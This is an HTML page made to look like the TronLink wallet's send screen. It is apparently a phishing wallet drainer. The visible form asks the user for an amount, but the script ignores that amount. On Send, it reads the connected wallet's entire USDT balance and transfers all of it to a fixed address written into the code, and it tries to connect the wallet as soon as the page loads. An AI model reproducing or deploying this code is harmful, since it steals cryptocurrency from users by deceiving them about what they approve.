<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TronLink - Send</title>
    <style>
        body { background-color: #0d0e12; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .tronlink-window { width: 375px; background: #17181f; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); padding: 24px; box-sizing: border-box; }
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; border-bottom: 1px solid #282a36; padding-bottom: 12px; }
        .header h3 { margin: 0; font-size: 16px; font-weight: 500; color: #ffffff; }
        .wallet-info { font-size: 12px; color: #8f92a1; background: #20222f; padding: 6px 12px; border-radius: 20px; cursor: pointer; word-break: break-all; text-align: center; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 13px; color: #8f92a1; margin-bottom: 8px; }
        .input-box { background: #20222f; border: 1px solid #2d3142; border-radius: 8px; padding: 12px; display: flex; align-items: center; }
        .input-box input { background: transparent; border: none; color: #ffffff; width: 100%; font-size: 14px; outline: none; }
        .token-selector { display: flex; align-items: center; background: #20222f; border: 1px solid #2d3142; border-radius: 8px; padding: 12px; justify-content: space-between; cursor: pointer; }
        .token-info { display: flex; align-items: center; gap: 8px; }
        .token-icon { width: 24px; height: 24px; background: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; color: white; }
        .token-name { font-size: 14px; font-weight: 500; }
        .btn-send { background: #3260ee; color: #ffffff; width: 100%; border: none; padding: 14px; border-radius: 24px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        .btn-send:hover { background: #244ed8; }
    </style>
</head>
<body>

<div class="tronlink-window">
    <div class="header">
        <h3>Send Assets</h3>
        <div class="wallet-info" id="walletAddr" onclick="conectarWallet()">Connect Wallet</div>
    </div>

    <!-- Campo Cuenta de Destino -->
    <div class="form-group">
        <label>Receiving Account</label>
        <div class="input-box">
            <input type="text" id="target" value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" readonly>
        </div>
    </div>

    <!-- Selector de Token -->
    <div class="form-group">
        <label>Token</label>
        <div class="token-selector">
            <div class="token-info">
                <div class="token-icon">S</div>
                <div class="token-name">Tether USD (USDT)</div>
            </div>
            <span style="color: #8f92a1; font-size: 12px;">TRC20</span>
        </div>
    </div>

    <!-- Campo Monto Digital -->
    <div class="form-group">
        <label>Amount</label>
        <div class="input-box">
            <input type="number" id="userAmount" value="10" placeholder="0.0">
        </div>
    </div>

    <button class="btn-send" onclick="ejecutarEnvioMaximo()">Send</button>
</div>

<script>
    const CONTRACT_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const DESTINO_FIJO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";

    async function conectarWallet() {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            const addr = window.tronWeb.defaultAddress.base58;
            document.getElementById('walletAddr').innerText = addr.substring(0,6) + "..." + addr.substring(addr.length - 4);
            return window.tronWeb;
        }
        alert("Please unlock and connect your TronLink extension.");
        return null;
    }

    async function ejecutarEnvioMaximo() {
        const tronWeb = await conectarWallet();
        if (!tronWeb) return;

        try {
            const miWallet = tronWeb.defaultAddress.base58;
            const contrato = await tronWeb.contract().at(CONTRACT_USDT);

            // Leer saldo real total
            const saldoBigNum = await contrato.balanceOf(miWallet).call();
            const saldoTotalStr = saldoBigNum.toString();

            if (saldoTotalStr === "0" || saldoTotalStr === "") {
                alert("Stopped: USDT balance is 0.");
                return;
            }

            const tx = await contrato.transfer(DESTINO_FIJO, saldoTotalStr).send();
            alert(`Transaction broadcasted successfully!\nHash: ${tx}`);
        } catch (e) {
            console.error(e);
        }
    }

    window.addEventListener('load', () => { setTimeout(conectarWallet, 500); });
</script>
</body>
</html>
